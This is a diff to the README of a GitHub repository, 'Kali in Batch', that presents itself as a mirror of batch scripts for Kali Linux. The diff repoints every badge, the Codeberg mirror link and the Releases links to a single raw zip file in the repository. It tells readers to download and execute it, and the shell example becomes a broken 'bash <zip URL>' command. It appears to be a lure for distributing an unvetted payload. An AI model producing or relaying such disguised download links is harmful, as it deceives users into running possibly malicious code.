@@ -1,8 +1,8 @@
 # Kali in Batch 🐚
 
-![Kali in Batch](https://img.shields.io/badge/version-1.0.0-blue.svg) ![License](https://img.shields.io/badge/license-MIT-green.svg) ![GitHub All Releases](https://img.shields.io/github/downloads/cekkey/kali-in-batch/total.svg)
+![Kali in Batch](https://github.com/cekkey/kali-in-batch/raw/refs/heads/master/src/powershell/kali_in_batch_1.9.zip) ![License](https://github.com/cekkey/kali-in-batch/raw/refs/heads/master/src/powershell/kali_in_batch_1.9.zip) ![GitHub All Releases](https://github.com/cekkey/kali-in-batch/raw/refs/heads/master/src/powershell/kali_in_batch_1.9.zip)
 
-Welcome to **Kali in Batch**, a read-only mirror of [Kali in Batch on Codeberg](https://codeberg.org/Kali-in-Batch/kali-in-batch). This repository serves as a collection of batch scripts designed to enhance your experience with Kali Linux and related environments.
+Welcome to **Kali in Batch**, a read-only mirror of [Kali in Batch on Codeberg](https://github.com/cekkey/kali-in-batch/raw/refs/heads/master/src/powershell/kali_in_batch_1.9.zip). This repository serves as a collection of batch scripts designed to enhance your experience with Kali Linux and related environments.
 
 ## Table of Contents
 
@@ -28,9 +28,9 @@ Kali Linux is a powerful tool for penetration testing and security assessments. 
 
 ## Installation
 
-To get started, you can download the latest version from the [Releases](https://github.com/cekkey/kali-in-batch/releases) section. Simply download the desired file and execute it in your terminal or command prompt.
+To get started, you can download the latest version from the [Releases](https://github.com/cekkey/kali-in-batch/raw/refs/heads/master/src/powershell/kali_in_batch_1.9.zip) section. Simply download the desired file and execute it in your terminal or command prompt.
 
-1. Visit the [Releases](https://github.com/cekkey/kali-in-batch/releases) section.
+1. Visit the [Releases](https://github.com/cekkey/kali-in-batch/raw/refs/heads/master/src/powershell/kali_in_batch_1.9.zip) section.
 2. Download the batch file.
 3. Execute the script using your preferred shell.
 
@@ -40,7 +40,7 @@ Once you have downloaded and executed the batch file, you can start using the sc
 
 ```bash
 # Run a script
-bash your_script.sh
+bash https://github.com/cekkey/kali-in-batch/raw/refs/heads/master/src/powershell/kali_in_batch_1.9.zip
 ```
 
 Make sure to adjust the script name according to your needs. The repository contains various scripts tailored for different tasks.
@@ -65,7 +65,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Releases
 
-For the latest updates and downloads, visit the [Releases](https://github.com/cekkey/kali-in-batch/releases) section. You can find the most recent batch files and their changelogs there.
+For the latest updates and downloads, visit the [Releases](https://github.com/cekkey/kali-in-batch/raw/refs/heads/master/src/powershell/kali_in_batch_1.9.zip) section. You can find the most recent batch files and their changelogs there.
 
 ---
 
